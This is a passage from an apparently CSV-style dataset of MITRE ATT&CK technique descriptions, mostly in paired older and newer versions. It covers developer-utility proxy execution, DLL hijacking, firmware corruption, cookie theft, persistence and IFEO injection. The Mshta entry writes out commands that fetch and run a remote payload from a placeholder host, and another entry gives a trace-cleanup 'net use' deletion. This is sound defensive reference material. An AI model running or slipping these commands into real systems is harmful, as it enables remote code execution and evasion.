### MSBuild

MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations. (Citation: MSDN MSBuild) 

Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file. (Citation: MSDN MSBuild) Inline Tasks MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution. (Citation: LOLBAS Msbuild)

### DNX

The .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation: Microsoft Migrating from DNX) DNX is not present on standard builds of Windows and may only be present on developer workstations using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. 

An adversary can use dnx.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for DNX. (Citation: engima0x3 DNX Bypass)

### RCSI

The rcsi.exe utility is a non-interactive command-line interface for C# that is similar to csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but has since been deprecated for an integrated solution. (Citation: Microsoft Roslyn CPT RCSI) The rcsi.exe binary is signed by Microsoft. (Citation: engima0x3 RCSI Bypass)

C# .csx script files can be written and executed with rcsi.exe at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting policies that do not account for execution of rcsi.exe. (Citation: engima0x3 RCSI Bypass)

### WinDbg/CDB

WinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows software development kits and can be used as standalone tools. (Citation: Microsoft Debugging Tools for Windows) They are commonly used in software development and reverse engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.

An adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for execution of those utilities. (Citation: Exploit Monday WinDbg)

It is likely possible to use other debuggers for similar purposes, such as the kernel-mode debugger kd.exe, which is also signed by Microsoft.

### Tracker

The file tracker utility, tracker.exe, is included with the .NET framework as part of MSBuild. It is used for logging calls to the Windows file system. (Citation: Microsoft Docs File Tracking)

An adversary can use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions. (Citation: LOLBAS Tracker)","Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions."
A099,T1574.001,17.0,18.0,DLL,DLL,"Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)

Specific ways DLLs are abused by adversaries include:

### DLL Sideloading
Adversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).

Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.

Adversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)

### DLL Search Order Hijacking
Adversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)

### DLL Redirection
Adversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)

### Phantom DLL Hijacking
Adversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)

### DLL Substitution
Adversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)

Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.

Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)

If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.","Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)

Specific ways DLLs are abused by adversaries include:

### DLL Sideloading
Adversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).

Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.

Adversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)

Adversaries may chain DLL sideloading multiple times to fragment functionality hindering analysis. Adversaries using multiple DLL files can split the loader functions across different DLLs, with a main DLL loading the separated export functions. (Citation: Virus Bulletin) Spreading loader functions across multiple DLLs makes analysis harder, since all files must be collected to fully understand the malware’s behavior.  Another method implements a “loader-for-a-loader”, where a malicious DLL’s sole role is to load a second DLL (or a chain of DLLs) that contain the real payload. (Citation: Sophos)

### DLL Search Order Hijacking
Adversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)

### DLL Redirection
Adversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)

### Phantom DLL Hijacking
Adversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)

### DLL Substitution
Adversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)

Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.

Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)

If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation."
A100,T1495,10.0,11.0,Firmware Corruption,Firmware Corruption,"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.","Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.

In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485)."
A101,T1079,2.0,3.0,Multilayer Encryption,Multilayer Encryption,"An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.

Detection: If malware uses Standard Cryptographic Protocol, SSL/TLS inspection can be used to detect command and control traffic within some encrypted communication channels. (Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. (Citation: SEI SSL Inspection Risks) After SSL/TLS inspection, additional cryptographic analysis may be needed to analyze the second layer of encryption.

With Custom Cryptographic Protocol, if malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures. (Citation: Fidelis DarkComet)

In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Process use of network, Malware reverse engineering, Process monitoring

Requires Network: Yes","An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS."
A102,T1126,2.0,3.0,Network Share Connection Removal,Network Share Connection Removal,"Windows shared drive and Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command. (Citation: Technet Net Use)

Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation.

Detection: Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of Windows Admin Shares. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.

Platforms: Windows

Data Sources: Process monitoring, Process command-line parameters, Packet capture, Authentication logs

Defense Bypassed: Host forensic analysis

Permissions Required: User, Administrator

System Requirements: Established network share connection to a remote system. Level of access depends on permissions of the account used.","Windows shared drive and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command. (Citation: Technet Net Use)

Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation."
A103,T1583,13.0,14.0,Acquire Infrastructure,Acquire Infrastructure,"Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Additionally, botnets are available for rent or purchase.

Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090).(Citation: amnesty_nso_pegasus) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.","Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Additionally, botnets are available for rent or purchase.

Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down."
A104,T1018,5.0,6.0,Remote System Discovery,Remote System Discovery,"Adversaries will likely attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used. Adversaries may also use local host files in order to discover the hostname to IP address mappings of remote systems. 

### Windows

Examples of tools and commands that acquire this information include ""ping"" or ""net view"" using [Net](https://attack.mitre.org/software/S0039). The contents of the <code>C:\Windows\System32\Drivers\etc\hosts</code> file can be viewed to gain insight into the existing hostname to IP mappings on the system.

### Mac

Specific to Mac, the <code>bonjour</code> protocol to discover additional Mac-based systems within the same broadcast domain. Utilities such as ""ping"" and others can be used to gather information about remote systems. The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into existing hostname to IP mappings on the system.

### Linux

Utilities such as ""ping"" and others can be used to gather information about remote systems. The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into existing hostname to IP mappings on the system.","Adversaries will likely attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used. Adversaries may also use local host files in order to discover the hostname to IP address mappings of remote systems. 

### Windows

Examples of tools and commands that acquire this information include ""ping"" or ""net view"" using [Net](https://attack.mitre.org/software/S0039). The contents of the <code>C:\Windows\System32\Drivers\etc\hosts</code> file can be viewed to gain insight into the existing hostname to IP mappings on the system.

### Mac

Specific to Mac, the <code>bonjour</code> protocol to discover additional Mac-based systems within the same broadcast domain. Utilities such as ""ping"" and others can be used to gather information about remote systems. The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into existing hostname to IP mappings on the system.

### Linux

Utilities such as ""ping"" and others can be used to gather information about remote systems. The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into existing hostname to IP mappings on the system.

### Cloud

In cloud environments, the above techniques may be used to discover remote systems depending upon the host operating system. In addition, cloud environments often provide APIs with information about remote systems and services.
"
A105,T1119,14.0,15.0,Automated Collection,Automated Collection,"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.","Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. 

In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) 

This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments."
A106,T1539,8.0,9.0,Steal Web Session Cookie,Steal Web Session Cookie,"An adversary may steal web application or service session cookies and use them to gain access web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)

There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)

After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1506) technique to login to the corresponding web application.","An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)

There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)

After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application."
A107,T1543.002,7.0,8.0,Systemd Service,Systemd Service,"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.

Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands:

* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. 
* ExecReload directive covers when a service restarts. 
* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.

Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at recurring intervals, such as at system boot.(Citation: Anomali Rocke March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018)

While adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)","Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.

Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands:

* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. 
* ExecReload directive covers when a service restarts. 
* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.

Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.(Citation: Anomali Rocke March 2019)

While adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)"
A108,T1012,2.0,3.0,Query Registry,Query Registry,"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

The Registry contains a significant amount of information about the operating system, configuration, software, and security. (Citation: Wikipedia Windows Registry) Some of the information may help adversaries to further their operation within a network.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Interaction with the Windows Registry may come from the command line using utilities such as Reg or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Windows

Data Sources: Windows Registry, Process monitoring, Process command-line parameters

Permissions Required: User, Administrator, SYSTEM","Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

The Registry contains a significant amount of information about the operating system, configuration, software, and security. (Citation: Wikipedia Windows Registry) Some of the information may help adversaries to further their operation within a network."
A109,T1547.011,9.0,10.0,Plist Modification,Plist Modification,"Adversaries may modify plist files to run a program during system boot or user login. Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). 

Adversaries can modify plist files to execute their code as part of establishing persistence. plists may also be used to elevate privileges since they may execute in the context of another user.(Citation: Sofacy Komplex Trojan) 

A specific plist used for execution at login is <code>com.apple.loginitems.plist</code>.(Citation: Methods of Mac Malware Persistence) Applications under this plist run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them.(Citation: Adding Login Items) Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to ""hide"" the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method <code> SMLoginItemSetEnabled</code> can be used to set Login Items, but scripting languages like [AppleScript](https://attack.mitre.org/techniques/T1059/002) can do this as well. (Citation: Adding Login Items)","Adversaries can modify property list files (plist files) to execute their code as part of establishing persistence. Plist files are used by macOS applications to store properties and configuration settings for applications and services. Applications use information plist files, <code>Info.plist</code>, to tell the operating system how to handle the application at runtime using structured metadata in the form of keys and values. Plist files are formatted in XML and based on Apple's Core Foundation DTD and can be saved in text or binary format.(Citation: fileinfo plist file description) 

Adversaries can modify paths to executed binaries, add command line arguments, and insert key/pair values to plist files in auto-run locations which execute upon user logon or system startup. Through modifying plist files in these locations, adversaries can also execute a malicious dynamic library (dylib) by adding a dictionary containing the <code>DYLD_INSERT_LIBRARIES</code> key combined with a path to a malicious dylib under the <code>EnvironmentVariables</code> key in a plist file. Upon user logon, the plist is called for execution and the malicious dylib is executed within the process space. Persistence can also be achieved by modifying the <code>LSEnvironment</code> key in the application's <code>Info.plist</code> file.(Citation: wardle artofmalware volume1)"
A110,T1129,3.0,4.0,Execution through Module Load,Execution through Module Load,"The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)

The module loader can load DLLs:

* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
    
* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
    
* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
    
* via <code><file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname""></code> in an embedded or external ""application manifest"". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.

Adversaries can use this functionality as a way to execute arbitrary code on a system.","The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)

The module loader can load DLLs:

* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
    
* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
    
* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
    
* via <code>&#x3c;file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname""&#x3e;</code> in an embedded or external ""application manifest"". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.

Adversaries can use this functionality as a way to execute arbitrary code on a system."
A111,T1170,5.0,6.0,Mshta,Mshta,"Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: GitHub SubTee The List)","Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)"
A112,T1183,2.0,3.0,Image File Execution Options Injection,Image File Execution Options Injection,"Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, any executable file present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

IFEOs can be set directly via the Registry or in Global Flags via the Gflags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as Debugger Values in the Registry under <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable></code> and <code> HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable> </code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

Similar to Process Injection, this value can be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Engame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

Detection: Monitor for common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. (Citation: Microsoft Dev Blog IFEO Mar 2010)

Monitor the IFEOs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Engame Process Injection July 2017)

Platforms: Windows

Data Sources: Process Monitoring, Windows Registry, Windows event logs

Permissions Required: Administrator, SYSTEM","Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

